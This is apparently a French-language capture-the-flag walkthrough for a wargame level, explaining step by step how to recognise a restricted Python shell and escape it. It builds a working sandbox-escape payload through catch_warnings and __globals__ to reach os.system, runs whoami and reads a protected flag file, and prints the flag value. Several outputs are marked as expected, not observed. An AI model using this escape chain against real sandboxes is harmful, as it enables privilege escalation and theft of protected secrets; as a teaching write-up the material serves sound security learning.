# Level07 — Comprendre une prison Python

## Objectif

Nous sommes connectés avec `level07`. Nous cherchons le secret de `flag07` pour passer au niveau suivant. Certaines commandes sont bloquées : nous devons comprendre pourquoi et trouver ce que le programme nous permet encore de faire.

## 1. Identifier l'environnement restreint

### Observer la connexion

```text
level06@snowcrash:/home/level00$ su level07
Password:
Last login: Mon Jan  1 00:00:00 2024 from 127.0.0.1
Session validator v2.1.4 — restricted access
You will never escape this
```

Le message `restricted access` signifie « accès limité ». Mais nous ne savons pas encore comment cet accès est limité.

### Tester les commandes habituelles

```text
level07@snowcrash:~$ ls
README
level07@snowcrash:~$ cat README
You will never escape this
level07@snowcrash:~$ find -name level07
Validator: Validator: find: permission denied
```

`ls` affiche les fichiers et `cat` leur contenu. Ces commandes fonctionnent, mais `find`, qui sert à rechercher des fichiers, est refusée. Le mot `Validator` indique qu'un programme semble vérifier nos commandes.

Nous affichons aussi les fichiers cachés :

```text
level07@snowcrash:~$ ls -la
total 16
-rw-r----- 1 level07 level07  128 Jan  1 00:00 .bash_history
-rw-r----- 1 level07 level07  128 Jan  1 00:00 .bashrc
-rw-r----- 1 level07 level07  128 Jan  1 00:00 .profile
-rw-r----- 1 level07 level07  128 Jan  1 00:00 README
level07@snowcrash:~$ cat .bashrc
# .bashrc — sourced for interactive shells
PS1='level07@snowcrash:\w\$ '
alias ll='ls -alF'
alias la='ls -A'
export HISTSIZE=100
level07@snowcrash:~$ cat .profile
Validator: cat: /home/level07/.profile: No such file or directory
```

`.bashrc` contient des réglages habituels du terminal. On remarque aussi que `.profile` apparaît dans la liste, mais que `cat` ne le trouve pas. Nous ne savons pas pourquoi.

### Découvrir un indice lié à Python

```text
level07@snowcrash:~$ cd
Validator: name 'cd' is not defined
level07@snowcrash:~$ cat
Validator: cat: missing operand
level07@snowcrash:~$ whoami
level07
```

Normalement, `cd` permet de changer de dossier. Ici, le message `name 'cd' is not defined` est inhabituel.

En recherchant **`name is not defined error`** sur Internet, nous découvrons que ce message ressemble à une erreur Python appelée `NameError` ([documentation](https://docs.python.org/3/library/exceptions.html#NameError)). Peut-être que le programme comprend du Python ?

Pour vérifier, essayons un calcul :

```python
1 + 1
```

Résultat attendu (à vérifier sur la VM) :

```text
2
```

On peut aussi tester cette expression Python (résultat attendu : `'BONJOUR'`) :

```python
"bonjour".upper()
```

Pour connaître les réglages de la session, nous pouvons aussi lancer `env`. Voici la ligne que nous cherchons à vérifier :

```text
SHELL=/opt/snowcrash/level07/jail.py
```

`SHELL` indique le programme qui reçoit nos commandes. `.py` désigne un fichier Python et *jail* signifie « prison » en anglais.

Une **Python Jail** est un programme qui accepte du Python mais bloque certaines actions. Pour vérifier les restrictions, nous pouvons essayer `dir()` (afficher les informations disponibles sur un objet) et `help()` (obtenir de l'aide).

```text
Message « restricted access »
    ↓
Certaines commandes Linux fonctionnent, d'autres sont refusées
    ↓
L'erreur de cd ressemble à une NameError Python
    ↓
Si 1 + 1 donne 2 et que SHELL pointe vers jail.py
    ↓
Nous identifions une session Python restreinte
```

**Recherche Internet :** `Python restricted shell` ou `Python jail CTF`. On découvre des défis similaires sur [CTF Wiki](https://ctf-wiki.mahaloz.re/pwn/linux/sandbox/python-sandbox-escape/) et [Pyjailbreaker](https://github.com/jailctf/pyjailbreaker).

**À vérifier sur la VM :** les tests Python et la sortie de `env`. Les commandes Linux ci-dessus ont été testées. Le code de `jail.py` n’est pas disponible pour confirmer son fonctionnement exact.

## 2. Comprendre que presque tout est un objet

En Python, un nombre, un texte ou une suite de valeurs sont des objets. Par exemple, ceci est un tuple (une suite de valeurs que l'on ne peut pas modifier) :

```python
(1, 2, 3)
```

Un tuple peut aussi être vide :

```python
()
```

Pourquoi partir de `()` ? Parce que c'est une valeur très simple que nous pouvons écrire sans charger de bibliothèque. Un nombre ou un texte pourrait aussi convenir si le programme l'autorise.

Chaque objet a un type, aussi appelé classe. Par exemple, `42` est de type `int` (nombre entier) et `()` est de type `tuple`.

**Recherche Internet :** `Python objects classes attributes` ([tutoriel Python](https://docs.python.org/fr/3/tutorial/classes.html)).

## 3. Remonter de `tuple` à `object`

Comment demander à Python le type de notre tuple ? La recherche `Python get class of object` nous fait découvrir `__class__` :

```python
().__class__
```

Résultat attendu :

```text
<class 'tuple'>
```

Le point permet d'accéder à une information sur l'objet. Ici, `__class__` donne son type.

Python permet aussi de retrouver les classes parentes, c'est-à-dire celles dont une classe reprend des fonctionnalités. Pour cela, nous découvrons `__mro__` en recherchant `Python class inheritance MRO` dans la [documentation Python](https://docs.python.org/fr/3/reference/datamodel.html).

```python
().__class__.__mro__
```

Pour notre tuple, le résultat attendu est, en simplifiant :

```text
tuple → object
```

`object` est la classe de base. Python compte à partir de zéro : `[1]` sélectionne donc le deuxième élément, `object`.

```python
().__class__.__mro__[1]
```

Pourquoi chercher `object` ? Parce qu'il nous permet de retrouver d'autres classes déjà présentes dans Python.

## 4. Retrouver les classes disponibles

La recherche `Python list subclasses of a class` nous fait découvrir [`__subclasses__()`](https://docs.python.org/3/reference/datamodel.html#type.__subclasses__). Cette fonction donne les classes qui héritent directement de la classe choisie.

Nous affichons leurs noms :

```python
[c.__name__ for c in ().__class__.__mro__[1].__subclasses__()]
```

`c` représente chaque classe à tour de rôle, et `c.__name__` donne son nom. Cette écriture courte fait la même chose que le code suivant (exemple pour comprendre, pas une commande à lancer dans la prison) :

```python
names = []
for c in classes:
    names.append(c.__name__)
```

Voir aussi [les listes en Python](https://docs.python.org/fr/3/tutorial/datastructures.html#list-comprehensions).

### Pourquoi choisir `catch_warnings` ?

Ce nom ne se devine pas. Les guides sur les Python Jail présentent cette classe comme une piste connue. Normalement, elle sert à gérer les avertissements Python ([documentation](https://docs.python.org/3/library/warnings.html#catch_warnings)). Nous vérifions qu’elle apparaît dans la liste obtenue à l’étape précédente.

Nous la cherchons par son nom plutôt que par sa position dans la liste, car cette position peut changer d'une version de Python à l'autre.

## 5. Comprendre le chemin vers `os`

Un module est un ensemble de fonctions Python. `os` contient des fonctions qui permettent de communiquer avec le système Linux. Nous cherchons à retrouver ce module sans avoir à le charger nous-mêmes.

La classe `catch_warnings` possède une fonction `__init__`. Une fonction Python garde un lien vers les informations du module dans lequel elle a été écrite. C'est ce lien qui nous intéresse.

| Élément | Rôle |
| --- | --- |
| `__init__` | Fonction utilisée lors de la création d'un objet. |
| `__globals__` | Informations disponibles dans le module de cette fonction. |
| `['sys']` | Récupère le module `sys` parmi ces informations. |
| `sys.modules` | Contient les modules déjà chargés. |
| `['os']` | Récupère le module `os`. |
| `os.system(...)` | Demande au système d'exécuter une commande. |

```text
tuple vide
   └─ classe tuple
       └─ classe parente object
           └─ sous-classes chargées
               └─ catch_warnings
                   └─ __init__.__globals__
                       └─ sys.modules['os']
                           └─ system(...)
```

**Recherche Internet :** `Python function __globals__`, `Python sys.modules`, `Python os.system`. Voir les liens en fin de document.

Chaque étape nous donne accès à la suivante. Cela ne change pas nos droits Linux : nous retrouvons une fonction qui existe déjà dans le programme. Ce chemin ne fonctionne que si les classes et modules nécessaires sont présents et accessibles.

## 6. Vérifier avec quel utilisateur la commande fonctionne

Avant de lire le secret, nous utilisons `whoami` pour vérifier avec quels droits la commande est exécutée.

La première partie du code cherche la classe `catch_warnings` par son nom. Le `[0]` prend le premier résultat trouvé. Le reste suit le chemin expliqué à l'étape précédente.

```python
[c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__ == 'catch_warnings'][0].__init__.__globals__['sys'].modules['os'].system('whoami')
```

Résultat attendu (à vérifier sur la VM) :

```text
flag07
```

Au début du niveau, `whoami` affichait `level07`. Si nous obtenons `flag07`, cela indique que la commande lancée depuis Python possède les droits de cet utilisateur. Sans le code du programme, nous ne savons pas encore pourquoi il possède ces droits.

## 7. Lire le flag

Nous gardons le même code et remplaçons `whoami` par `cat`, qui permet de lire un fichier. Le chemin que nous cherchons à vérifier est `/home/flag07/.flag`.

```python
[c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__ == 'catch_warnings'][0].__init__.__globals__['sys'].modules['os'].system('cat /home/flag07/.flag')
```

Résultat :

```text
fiumuikeil8rung8ahcuiperb
```